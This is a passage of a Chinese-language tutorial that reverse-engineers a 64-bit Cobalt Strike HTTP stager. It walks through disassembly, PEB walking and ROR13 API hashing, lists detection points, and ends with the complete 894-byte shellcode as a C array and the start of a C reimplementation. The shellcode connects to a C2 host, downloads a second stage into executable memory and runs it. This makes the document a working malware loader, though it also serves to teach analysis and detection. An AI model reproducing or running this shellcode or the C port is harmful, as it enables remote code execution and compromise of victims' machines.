> **初学者提示**：PE（Portable Executable）是 Windows 可执行文件格式。每个 DLL/EXE 都是 PE 文件。导出表（Export Directory）列出了这个 DLL 提供给外部调用的所有函数。`0x20B` 是 PE32+ 的魔数，表示这是 64 位 PE 文件。

#### 3.2.5 遍历导出函数，计算函数名哈希

```asm
hash_function_name:
00000080  AC                    lodsb          ; al = [rsi], rsi++
00000081  41 C1 C9 0D           ror r9d, 0Dh   ; ROR13
00000085  41 01 C1              add r9d, eax   ; 哈希 += 字符
00000088  38 E0                 cmp al, ah     ; al == 0?（字符串结束）
0000008A  75 F1                 jne hash_function_name
```

注意：函数名哈希计算**不做大小写转换**（与模块名不同），因为导出函数名是区分大小写的。

#### 3.2.6 哈希匹配与地址解析

```asm
; 组合哈希：module_hash + function_hash
0000008C  4C 03 4C 24 08        add r9, qword ptr [rsp+8]  ; r9 = 函数哈希 + 模块哈希
00000091  45 39 D1              cmp r9d, r10d               ; 与目标哈希比较
00000094  75 D8                 jne resolve_next_export_name ; 不匹配则继续

; 匹配成功，解析函数地址
00000096  58                    pop rax                        ; rax = 导出目录地址
00000097  44 8B 40 24           mov r8d, dword ptr [rax+24h]  ; AddressOfNameOrdinals
0000009B  49 01 D0              add r8, rdx
0000009E  66 41 8B 0C 48        mov cx, word ptr [r8+rcx*2]   ; cx = 序号(Ordinal)
000000A3  44 8B 40 1C           mov r8d, dword ptr [rax+1Ch]  ; AddressOfFunctions
000000A7  49 01 D0              add r8, rdx
000000AA  41 8B 04 88           mov eax, dword ptr [r8+rcx*4] ; eax = 函数RVA
000000AE  48 01 D0              add rax, rdx                   ; rax = 函数真实地址
```

**地址解析过程：**

```
函数名 → 在 AddressOfNames 中找到索引 → 
用索引在 AddressOfNameOrdinals 中找到序号 → 
用序号在 AddressOfFunctions 中找到 RVA → 
RVA + DllBase = 函数真实地址
```

> **初学者提示**：Windows DLL 的导出表有三张关键的表：
> - **AddressOfNames**：函数名字符串的 RVA 数组
> - **AddressOfNameOrdinals**：函数名对应的序号数组
> - **AddressOfFunctions**：函数地址的 RVA 数组
>
> 查找过程就像查字典：先在目录中找到字，得到页码，再翻到对应页码。

#### 3.2.7 跳转到目标 API

```asm
; 恢复寄存器
000000B1-000000BC  pop r8/r8/rsi/rcx/rdx/r8/r9/r10

; 预留 shadow space 并跳转
000000BE  48 83 EC 20           sub rsp, 20h   ; Windows x64调用约定要求32字节shadow space
000000C2  41 52                 push r10       ; 构造返回地址
000000C4  FF E0                 jmp rax        ; 跳转到目标API
```

> **初学者提示**：Windows x64 调用约定要求调用者在栈上预留 32 字节的 "shadow space"（影子空间），供被调用函数保存 rcx、rdx、r8、r9 这四个寄存器参数。`jmp rax` 而不是 `call rax` 是因为返回地址已经通过 `push r10` 放在栈上了——当 API 函数执行 `ret` 时，会返回到 r10 指向的位置。

#### 3.2.8 失败处理：继续遍历下一个模块

```asm
resolve_module_failed:
000000C7  41 59                 pop r9          ; 恢复模块哈希
000000C9  5A                    pop rdx          ; 恢复LDR节点
000000CA  48 8B 12              mov rdx, qword ptr [rdx]  ; rdx = 下一个模块
000000CD  E9 4F FF FF FF        jmp resolve_next_module   ; 继续遍历
```

---

### 3.3 主逻辑（Main Logic）：0x0D2 - 0x364

#### 3.3.1 获取 Resolver 地址

```asm
loc_get_resolver_base:
000000D2  5D                    pop rbp    ; rbp = 0x0A（API Hash Resolver起始地址）
```

还记得入口点的 `call` 吗？这里 `pop` 取出了压栈的返回地址 `0x0A`，赋给 rbp。之后所有 API 调用都通过 `call rbp` 来调用 API Hash Resolver。

> **初学者提示**：rbp 现在相当于一个"万能函数指针"。每次调用前，把目标 API 的哈希值放入 r10d，然后 `call rbp`，就能得到对应 API 的地址并执行。

#### 3.3.2 加载 wininet.dll

```asm
000000D3  6A 00                 push 0                              ; 字符串结尾NULL
000000D5  49 BE 77 69 6E 69 6E 65 74 00  mov r14, "wininet\0"     ; 栈上构造字符串
000000DF  41 56                 push r14
000000E1  49 89 E6              mov r14, rsp                        ; r14 = &"wininet"
000000E4  4C 89 F1              mov rcx, r14                        ; rcx = lpLibFileName
000000E7  41 BA 4C 77 26 07     mov r10d, 0726774Ch                 ; hash = LoadLibraryA
000000ED  FF D5                 call rbp                            ; LoadLibraryA("wininet")
```

**技巧解析**：shellcode 需要传递字符串 `"wininet"` 给 `LoadLibraryA`，但字符串在哪里？答案是**在栈上构造**：

1. `push 0` — 压入 NULL 终止符
2. `mov r14, 0074656E696E6977h` — 将 `"wininet"` 的 ASCII 码作为立即数加载到 r14（小端序：`77 69 6E 69 6E 65 74 00` = `w i n i n e t \0`）
3. `push r14` — 将字符串压入栈
4. `mov r14, rsp` — r14 指向栈上的字符串

> **初学者提示**：这是一种非常常见的 shellcode 技巧——利用栈来构造字符串。因为 shellcode 没有数据段，所有字符串都需要在运行时动态创建。

#### 3.3.3 InternetOpenA — 初始化 WinINet

```asm
000000EF  48 31 C9              xor rcx, rcx    ; lpszAgent = NULL
000000F2  48 31 D2              xor rdx, rdx    ; dwAccessType = 0（默认/预配置）
000000F5  4D 31 C0              xor r8, r8      ; lpszProxy = NULL
000000F8  4D 31 C9              xor r9, r9      ; lpszProxyBypass = NULL
000000FB  41 50                 push r8         ; dwFlags = 0
000000FD  41 50                 push r8         ; 栈对齐/占位
000000FF  41 BA 3A 56 79 A7     mov r10d, 0A779563Ah  ; hash = InternetOpenA
00000105  FF D5                 call rbp
```

`InternetOpenA` 是使用 WinINet 的第一步，它初始化 WinINet 库并返回一个句柄 `hInternet`。参数全部为 NULL/0，表示使用默认配置。

> **初学者提示**：Windows x64 调用约定中，前 4 个参数通过 rcx、rdx、r8、r9 传递，第 5 个及以后的参数通过栈传递。`InternetOpenA` 有 5 个参数，所以第 5 个参数（dwFlags）需要 `push` 到栈上。多出的一个 `push r8` 是为了保持栈 16 字节对齐。

#### 3.3.4 获取 C2 地址和 URI 的跳转技巧

shellcode 需要获取内嵌在代码尾部的字符串地址（C2 主机地址和 URI 路径），但不知道自己的加载地址。它使用了 **call/pop 技巧**：

```
主逻辑流程中的跳转关系：

InternetOpenA 返回后
    │
    ├─ jmp loc_call_get_uri (0x181)
    │       │
    │       └─ call loc_after_pop_uri (0x128)
    │               │  将返回地址 0x186 压栈
    │               │
    │               └─ pop rbx → rbx = 0x186（URI "/ZWy3" 的地址）
    │
    │   HttpOpenRequestA 返回后
    │       │
    │       ├─ ... (发送请求循环) ...
    │       │
    │       └─ loc_call_get_c2 (0x17C)
    │               │
    │               └─ jmp loc_call_host_string (0x365)
    │                       │
    │                       └─ call loc_after_pop_c2 (0x109)
    │                               │  将返回地址 0x36A 压栈
    │                               │
    │                               └─ pop rdx → rdx = 0x36A（C2地址字符串）
```

> **初学者提示**：这个跳转链看起来很绕，但核心思想很简单：`call` 指令会把**下一条指令的地址**压入栈中，而 `call` 的目标处用 `pop` 取出这个地址——这个地址恰好是紧跟在 `call` 后面的数据的位置。这是一种在位置无关代码中引用内嵌数据的标准技巧。

#### 3.3.5 InternetConnectA — 连接 C2 服务器

```asm
00000109  5A                    pop rdx          ; rdx = "192.168.137.129"
0000010A  48 89 C1              mov rcx, rax     ; rcx = hInternet
0000010D  41 B8 50 00 00 00     mov r8d, 50h     ; r8d = 端口 80
00000113  4D 31 C9              xor r9, r9       ; r9 = lpszUserName = NULL
00000116  41 51                 push r9          ; dwContext = 0
00000118  41 51                 push r9          ; dwFlags = 0
0000011A  6A 03                 push 3           ; dwService = INTERNET_SERVICE_HTTP
0000011C  41 51                 push r9          ; lpszPassword = NULL
0000011E  41 BA 57 89 9F C6     mov r10d, 0C69F8957h  ; hash = InternetConnectA
00000124  FF D5                 call rbp
```

连接到 C2 服务器 `192.168.137.129:80`，使用 HTTP 服务。注意参数的传递方式：前 4 个通过寄存器，后面的通过栈，且栈参数的压入顺序是**从右到左**（和 cdecl 调用约定一致）。

#### 3.3.6 HttpOpenRequestA — 创建 HTTP GET 请求

```asm
00000128  5B                    pop rbx          ; rbx = URI地址 "/ZWy3"
00000129  48 89 C1              mov rcx, rax     ; rcx = hConnect
0000012C  48 31 D2              xor rdx, rdx     ; rdx = lpszVerb = NULL (GET)
0000012F  49 89 D8              mov r8, rbx      ; r8 = lpszObjectName = "/ZWy3"
00000132  4D 31 C9              xor r9, r9       ; r9 = lpszVersion = NULL
00000135  52                    push rdx         ; dwContext = 0
00000136  68 00 02 40 84        push 84400200h   ; dwFlags
0000013B  52                    push rdx         ; lplpszAcceptTypes = NULL
0000013C  52                    push rdx         ; lpszReferrer = NULL
0000013D  41 BA EB 55 2E 3B     mov r10d, 03B2E55EBh  ; hash = HttpOpenRequestA
00000143  FF D5                 call rbp
```

创建一个 HTTP GET 请求，目标路径为 `/ZWy3`。`dwFlags = 0x84400200` 是一组标志的组合：

| 标志 | 值 | 含义 |
|------|------|------|
| INTERNET_FLAG_RELOAD | 0x200 | 强制从服务器重新下载 |
| INTERNET_FLAG_NO_CACHE_WRITE | 0x4000000 | 不写入缓存 |
| INTERNET_FLAG_KEEP_CONNECTION | 0x400000 | 保持连接（Keep-Alive） |
| 其他标志 | 0x80000000 | 证书/安全相关 |

#### 3.3.7 HttpSendRequestA — 发送请求（带重试）

```asm
; 保存请求句柄，设置重试次数
00000145  48 89 C6              mov rsi, rax     ; rsi = hRequest
00000148  48 83 C3 50           add rbx, 50h     ; rbx指向User-Agent Header
0000014C  6A 0A                 push 0Ah
0000014E  5F                    pop rdi           ; rdi = 10（重试次数）

; 重试循环
loc_send_request:
0000014F  48 89 F1              mov rcx, rsi     ; hRequest
00000152  48 89 DA              mov rdx, rbx     ; lpszHeaders（User-Agent）
00000155  49 C7 C0 FF FF FF FF  mov r8, -1       ; dwHeadersLength = -1（自动计算长度）
0000015C  4D 31 C9              xor r9, r9       ; lpOptional = NULL
0000015F  52                    push rdx
00000160  52                    push rdx
00000161  41 BA 2D 06 18 7B     mov r10d, 07B18062Dh  ; hash = HttpSendRequestA
00000167  FF D5                 call rbp

00000169  85 C0                 test eax, eax    ; 是否成功
0000016B  0F 85 9D 01 00 00     jne loc_request_success  ; 成功→跳到下载阶段
00000171  48 FF CF              dec rdi           ; 重试次数-1
00000174  0F 84 8C 01 00 00     je loc_failure    ; 重试耗尽→失败
0000017A  EB D3                 jmp loc_send_request  ; 继续重试
```

**重试逻辑**：最多尝试 10 次发送 HTTP 请求。每次失败后重试计数器 rdi 减 1，如果减到 0 则进入失败路径。

> **初学者提示**：`push 0Ah; pop rdi` 比 `mov rdi, 10` 短 2 个字节。在 shellcode 中，每字节都很珍贵，所以经常使用这种技巧来节省空间。

#### 3.3.8 VirtualAlloc — 分配可执行内存

```asm
loc_request_success:
0000030E  48 31 C9              xor rcx, rcx     ; lpAddress = NULL（系统自动选择地址）
00000311  BA 00 00 40 00        mov edx, 400000h ; dwSize = 4MB
00000316  41 B8 00 10 00 00     mov r8d, 1000h   ; flAllocationType = MEM_COMMIT
0000031C  41 B9 40 00 00 00     mov r9d, 40h     ; flProtect = PAGE_EXECUTE_READWRITE
00000322  41 BA 58 A4 53 E5     mov r10d, 0E553A458h  ; hash = VirtualAlloc
00000328  FF D5                 call rbp
```

分配一块 **4MB** 大小的内存，权限为 **可读可写可执行（RWX）**。这块内存将用来存放从 C2 下载的第二阶段 payload。

> **初学者提示**：`PAGE_EXECUTE_READWRITE (0x40)` 是最宽松的内存权限——既可写又可执行。正常程序很少需要这种权限，它的出现通常是恶意代码的标志。现代 EDR/AV 产品会监控 `VirtualAlloc` 调用 RWX 内存的请求。

#### 3.3.9 InternetReadFile — 下载循环

```asm
; 初始化下载
0000032A  48 93                 xchg rax, rbx    ; rbx = 分配的缓冲区地址
0000032C  53                    push rbx         ; 保存缓冲区起始地址
0000032D  53                    push rbx         ; 再次保存
0000032E  48 89 E7              mov rdi, rsp     ; rdi = &bytesRead（用栈作为输出变量）
00000331  48 89 F1              mov rcx, rsi     ; hRequest
00000334  48 89 DA              mov rdx, rbx     ; 当前写入位置
00000337  41 B8 00 20 00 00     mov r8d, 2000h   ; 每次读取8KB

; 读取循环
loc_read_loop:
00000340  41 BA 12 96 89 E2     mov r10d, 0E2899612h  ; hash = InternetReadFile
00000346  FF D5                 call rbp
00000348  48 83 C4 20           add rsp, 20h     ; 修复shadow space
0000034C  85 C0                 test eax, eax    ; 读取是否成功
0000034E  74 B6                 je loc_failure   ; 失败→退出
00000350  66 8B 07              mov ax, word ptr [rdi]  ; ax = bytesRead
00000353  48 01 C3              add rbx, rax     ; 缓冲区指针前移
00000356  85 C0                 test eax, eax    ; bytesRead == 0?
00000358  75 D7                 jne loc_read_loop  ; 还有数据→继续读
```

**下载流程**：
1. 每次调用 `InternetReadFile` 读取 8KB（0x2000）数据
2. 将读取到的字节数加到缓冲区指针上，为下次读取做准备
3. 如果 `bytesRead == 0`，说明数据已全部读取完毕
4. 如果 `InternetReadFile` 返回失败（eax == 0），进入失败路径

> **初学者提示**：HTTP 响应可能很大，不能一次性读完。所以需要循环调用 `InternetReadFile`，每次读一块，直到返回 0 字节为止。这就像用水桶从水缸里舀水——每次舀一桶，直到舀空。

#### 3.3.10 执行第二阶段 Payload

```asm
; 读取完毕，执行payload
0000035A  58                    pop rax          ; 取回缓冲区起始地址
0000035B  58                    pop rax
0000035C  58                    pop rax          ; 三次pop，取到最初保存的地址
0000035D  48 05 00 00 00 00     add rax, 0       ; 无偏移调整
00000363  50                    push rax         ; 将payload地址压栈
00000364  C3                    ret              ; ret → 跳转到payload执行
```

`ret` 指令从栈上弹出返回地址并跳转过去。这里把 payload 的起始地址压入栈后执行 `ret`，等价于**跳转到下载的 payload 并执行**。

> **初学者提示**：`push rax; ret` 是 `jmp rax` 的等价写法，在某些场景下更方便（比如不需要额外修改寄存器）。至此，stager 的使命完成——它下载了真正的恶意代码并交出了控制权。

---

### 3.4 内嵌数据区

shellcode 尾部包含几段重要的内嵌数据：

| 偏移 | 内容 | 说明 |
|------|------|------|
| 0x186 | `"/ZWy3\0"` | HTTP 请求 URI |
| 0x18C - 0x1D5 | 随机/配置数据 | Cobalt Strike 配置元数据 |
| 0x1D6 - 0x233 | `"User-Agent: Mozilla/5.0 ..."` | 伪造的浏览器 User-Agent |
| 0x234 - 0x305 | 随机/配置数据 | 更多配置元数据 |
| 0x36A | `"192.168.137.129\0"` | C2 服务器地址 |

**User-Agent 完整内容**：
```
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MAGWJS)\r\n
```

> **初学者提示**：伪造 User-Agent 是为了让 HTTP 请求看起来像正常的浏览器访问，以躲避网络监控。`MAGWJS` 是 Cobalt Strike 的一个特征标识，安全产品可以通过这个特征检测 Cobalt Strike 流量。

---

## 四、完整执行流程图

```
┌──────────────────────────────────────────────────────────────┐
│                        Shellcode 启动                         │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  1. cld; and rsp, -16; call+pop → rbp = API Resolver地址     │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  2. LoadLibraryA("wininet") → 加载 wininet.dll               │
│     调用方式: r10d=hash, call rbp                             │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  3. InternetOpenA(NULL,0,NULL,NULL,0) → hInternet            │
│     初始化 WinINet 库                                         │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  4. InternetConnectA(hInternet, "192.168.137.129", 80, ...)  │
│     → hConnect                                               │
│     连接到 C2 服务器                                          │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  5. HttpOpenRequestA(hConnect, NULL, "/ZWy3", ...)           │
│     → hRequest                                               │
│     创建 HTTP GET 请求                                        │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  6. HttpSendRequestA(hRequest, "User-Agent: ...", -1, NULL)  │
│     ┌─────────────────────────────────────────┐               │
│     │  重试循环：最多 10 次                     │               │
│     │  失败 → 重试 / 耗尽 → ExitProcess       │               │
│     │  成功 → 继续                             │               │
│     └─────────────────────────────────────────┘               │
└──────────────────────────┬───────────────────────────────────┘
                           │ 成功
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  7. VirtualAlloc(NULL, 0x400000, MEM_COMMIT, PAGE_RWX)      │
│     → 分配 4MB 可执行内存                                     │
└──────────────────────────┬───────────────────────────────────┘
                           │
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  8. InternetReadFile 循环                                     │
│     ┌─────────────────────────────────────────┐               │
│     │  每次读取 8KB，写入分配的内存             │               │
│     │  bytesRead == 0 → 下载完毕               │               │
│     └─────────────────────────────────────────┘               │
└──────────────────────────┬───────────────────────────────────┘
                           │ 下载完毕
                           ▼
┌──────────────────────────────────────────────────────────────┐
│  9. push payload_addr; ret → 执行第二阶段 payload             │
│     Stager 使命完成，控制权交给 Beacon                         │
└──────────────────────────────────────────────────────────────┘
```

---

## 五、关键技巧总结

| 技巧 | 说明 | 出现位置 |
|------|------|----------|
| **call/pop 获取当前地址** | 利用 call 压栈返回地址的特性，获取位置无关的代码/数据地址 | 0x005, 0x181, 0x365 |
| **PEB 遍历** | 通过 gs:[0x60] 获取 PEB，遍历已加载模块链表 | 0x014 |
| **ROR13 哈希** | 用循环右移 13 位的哈希算法匹配 API 名称 | 0x037, 0x081 |
| **PE 导出表解析** | 手动解析 PE 结构，从导出表中获取函数地址 | 0x043-0x0AE |
| **栈上构造字符串** | 通过 push 立即数在栈上构造字符串参数 | 0x0D3-0x0E1 |
| **jmp rax 代替 call** | 通过 push+ret 构造调用，避免额外的 call 开销 | 0x0C2-0x0C4 |
| **短指令替换** | `push imm8; pop reg` 代替 `mov reg, imm32` 节省字节 | 0x14C-0x14E |
| **重试机制** | HTTP 请求失败后自动重试，提高可靠性 | 0x14F-0x17A |

---

## 六、API 哈希对照表

| API 函数 | ROR13 哈希 | 调用位置 |
|----------|-----------|----------|
| LoadLibraryA | 0x0726774C | 0x0E7 |
| InternetOpenA | 0xA779563A | 0x0FF |
| InternetConnectA | 0xC69F8957 | 0x11E |
| HttpOpenRequestA | 0x03B2E55EB | 0x13D |
| HttpSendRequestA | 0x07B18062D | 0x161 |
| VirtualAlloc | 0xE553A458 | 0x322 |
| InternetReadFile | 0xE2899612 | 0x340 |

---

## 七、安全检测要点

从防御角度看，这段 shellcode 有以下可检测特征：

1. **RWX 内存分配**：`VirtualAlloc` 请求 `PAGE_EXECUTE_READWRITE` 内存，这是高度可疑行为
2. **PEB 遍历**：直接访问 `gs:[0x60]` 遍历模块，绕过正常 API 调用
3. **ROR13 哈希**：使用哈希而非字符串引用 API，是 shellcode 的典型特征
4. **User-Agent 特征**：`MAGWJS` 是 Cobalt Strike 的已知特征
5. **已知哈希值**：上述 API 哈希值已被广泛收录入威胁情报库
6. **硬编码 C2 地址**：`192.168.137.129` 直接内嵌在 shellcode 中

## 参考shellcode
```
unsigned char hexData[894] = {

    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,

    0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,

    0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,

    0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,

    0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x66, 0x81, 0x78,

    0x18, 0x0B, 0x02, 0x75, 0x72, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67,

    0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56,

    0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,

    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24,

    0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41,

    0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,

    0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83,

    0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x4F, 0xFF,

    0xFF, 0xFF, 0x5D, 0x6A, 0x00, 0x49, 0xBE, 0x77, 0x69, 0x6E, 0x69, 0x6E, 0x65, 0x74, 0x00, 0x41,

    0x56, 0x49, 0x89, 0xE6, 0x4C, 0x89, 0xF1, 0x41, 0xBA, 0x4C, 0x77, 0x26, 0x07, 0xFF, 0xD5, 0x48,

    0x31, 0xC9, 0x48, 0x31, 0xD2, 0x4D, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x41, 0x50, 0x41, 0x50, 0x41,

    0xBA, 0x3A, 0x56, 0x79, 0xA7, 0xFF, 0xD5, 0xEB, 0x73, 0x5A, 0x48, 0x89, 0xC1, 0x41, 0xB8, 0x50,

    0x00, 0x00, 0x00, 0x4D, 0x31, 0xC9, 0x41, 0x51, 0x41, 0x51, 0x6A, 0x03, 0x41, 0x51, 0x41, 0xBA,

    0x57, 0x89, 0x9F, 0xC6, 0xFF, 0xD5, 0xEB, 0x59, 0x5B, 0x48, 0x89, 0xC1, 0x48, 0x31, 0xD2, 0x49,

    0x89, 0xD8, 0x4D, 0x31, 0xC9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xBA, 0xEB,

    0x55, 0x2E, 0x3B, 0xFF, 0xD5, 0x48, 0x89, 0xC6, 0x48, 0x83, 0xC3, 0x50, 0x6A, 0x0A, 0x5F, 0x48,

    0x89, 0xF1, 0x48, 0x89, 0xDA, 0x49, 0xC7, 0xC0, 0xFF, 0xFF, 0xFF, 0xFF, 0x4D, 0x31, 0xC9, 0x52,

    0x52, 0x41, 0xBA, 0x2D, 0x06, 0x18, 0x7B, 0xFF, 0xD5, 0x85, 0xC0, 0x0F, 0x85, 0x9D, 0x01, 0x00,

    0x00, 0x48, 0xFF, 0xCF, 0x0F, 0x84, 0x8C, 0x01, 0x00, 0x00, 0xEB, 0xD3, 0xE9, 0xE4, 0x01, 0x00,

    0x00, 0xE8, 0xA2, 0xFF, 0xFF, 0xFF, 0x2F, 0x45, 0x70, 0x76, 0x32, 0x00, 0x7D, 0x5F, 0x2C, 0x63,

    0x3F, 0x38, 0xDC, 0xEA, 0x4A, 0x42, 0xBE, 0x5D, 0x1A, 0x51, 0xA6, 0x40, 0x2B, 0xAF, 0x1F, 0x5D,

    0x0D, 0xC4, 0x73, 0xCB, 0xCC, 0x63, 0x71, 0xAD, 0x11, 0x80, 0x3E, 0xB3, 0x05, 0x52, 0xA8, 0x36,

    0x45, 0x55, 0xAA, 0x53, 0xFE, 0x9D, 0xB9, 0x46, 0x0B, 0x9D, 0x54, 0xAD, 0x1E, 0x75, 0xD1, 0xFE,

    0x4C, 0x8D, 0x8A, 0x14, 0x60, 0x3B, 0xFA, 0xF7, 0x4A, 0xD7, 0xFA, 0xB0, 0x65, 0x33, 0x40, 0x0E,

    0xCB, 0x08, 0x3C, 0x9F, 0x41, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2D, 0x41, 0x67, 0x65, 0x6E, 0x74,

    0x3A, 0x20, 0x4D, 0x6F, 0x7A, 0x69, 0x6C, 0x6C, 0x61, 0x2F, 0x35, 0x2E, 0x30, 0x20, 0x28, 0x63,

    0x6F, 0x6D, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6C, 0x65, 0x3B, 0x20, 0x4D, 0x53, 0x49, 0x45, 0x20,

    0x31, 0x30, 0x2E, 0x30, 0x3B, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x20, 0x4E, 0x54,

    0x20, 0x36, 0x2E, 0x32, 0x3B, 0x20, 0x57, 0x69, 0x6E, 0x36, 0x34, 0x3B, 0x20, 0x78, 0x36, 0x34,

    0x3B, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6E, 0x74, 0x2F, 0x36, 0x2E, 0x30, 0x3B, 0x20, 0x4D,

    0x41, 0x54, 0x4D, 0x4A, 0x53, 0x29, 0x0D, 0x0A, 0x00, 0xEE, 0x19, 0x4C, 0xA5, 0x37, 0x63, 0x8C,

    0x06, 0x27, 0x71, 0x34, 0x18, 0xC6, 0xDB, 0x03, 0xA1, 0x0C, 0xE0, 0xD1, 0xEA, 0xC1, 0x4F, 0xDA,

    0xDE, 0x6F, 0xBE, 0x5B, 0x5B, 0x6E, 0x57, 0x65, 0xE2, 0x31, 0x25, 0x27, 0xBC, 0x03, 0x64, 0x94,

    0xE8, 0x46, 0xCF, 0xBC, 0xDB, 0xA1, 0x9B, 0x4D, 0x04, 0xF3, 0xA6, 0x78, 0xA7, 0xAA, 0xA4, 0xFE,

    0x08, 0x14, 0x73, 0x97, 0xA9, 0xC6, 0x41, 0xBE, 0x01, 0xFC, 0xC1, 0xB2, 0xBF, 0x89, 0x61, 0xB5,

    0x42, 0x8E, 0x1A, 0xAA, 0x3B, 0x8C, 0xAB, 0x88, 0x0A, 0x2C, 0x0B, 0xA9, 0xC4, 0xCD, 0x9F, 0xA6,

    0xDF, 0x77, 0xC2, 0x77, 0x9B, 0xCC, 0x49, 0x51, 0xA9, 0xA9, 0x64, 0x7D, 0xDD, 0x02, 0xD7, 0xBF,

    0x79, 0xCC, 0x47, 0x71, 0x9A, 0x67, 0x72, 0x6F, 0x4F, 0xEA, 0x49, 0xE0, 0x80, 0xA0, 0x86, 0x34,

    0x8D, 0x5D, 0xA3, 0xD4, 0xF0, 0x35, 0x2C, 0x44, 0xFC, 0x9E, 0x3E, 0x26, 0xAD, 0xEB, 0x98, 0x99,

    0x0C, 0x50, 0xF3, 0x24, 0x49, 0x09, 0xB1, 0xA4, 0x13, 0xA3, 0x74, 0x87, 0x4C, 0x0E, 0x6E, 0x7A,

    0xB1, 0xE6, 0x83, 0xC5, 0xCF, 0x28, 0x43, 0x54, 0xAA, 0xDB, 0xC3, 0x43, 0x20, 0xF9, 0x48, 0x63,

    0xF9, 0x30, 0xE9, 0x6D, 0x8C, 0xE5, 0x68, 0x3B, 0xAF, 0x2C, 0x4F, 0x48, 0x5C, 0xC3, 0x85, 0x3E,

    0x14, 0x3B, 0xC8, 0x1B, 0xDA, 0x8D, 0xD3, 0xBF, 0x09, 0xC3, 0xB3, 0x43, 0x07, 0xC2, 0xCF, 0xD7,

    0x86, 0xD9, 0x73, 0x18, 0x0C, 0x00, 0x41, 0xBE, 0xF0, 0xB5, 0xA2, 0x56, 0xFF, 0xD5, 0x48, 0x31,

    0xC9, 0xBA, 0x00, 0x00, 0x40, 0x00, 0x41, 0xB8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xB9, 0x40, 0x00,

    0x00, 0x00, 0x41, 0xBA, 0x58, 0xA4, 0x53, 0xE5, 0xFF, 0xD5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89,

    0xE7, 0x48, 0x89, 0xF1, 0x48, 0x89, 0xDA, 0x41, 0xB8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xF9,

    0x41, 0xBA, 0x12, 0x96, 0x89, 0xE2, 0xFF, 0xD5, 0x48, 0x83, 0xC4, 0x20, 0x85, 0xC0, 0x74, 0xB6,

    0x66, 0x8B, 0x07, 0x48, 0x01, 0xC3, 0x85, 0xC0, 0x75, 0xD7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00,

    0x00, 0x00, 0x00, 0x50, 0xC3, 0xE8, 0x9F, 0xFD, 0xFF, 0xFF, 0x31, 0x39, 0x32, 0x2E, 0x31, 0x36,

    0x38, 0x2E, 0x31, 0x33, 0x37, 0x2E, 0x31, 0x32, 0x39, 0x00, 0x27, 0xBC, 0x86, 0xAA

};
```


## 对应的C语言代码
```
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "kernel32.lib")

// 从 shellcode 中提取的常量
#define C2_HOST "192.168.137.129"
#define C2_PORT 80
#define REQUEST_URI "/ZWy3"
#define USER_AGENT "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MAGWJS)\r\n"
#define BUFFER_SIZE 0x2000          // 每次读取 8KB
#define STAGE_SIZE 0x400000         // 预分配 4MB
#define MAX_RETRIES 10

// 与 shellcode 匹配的 dwFlags 值（常见组合）
#define HTTP_OPEN_FLAGS (INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_KEEP_CONNECTION | 0x80000000)

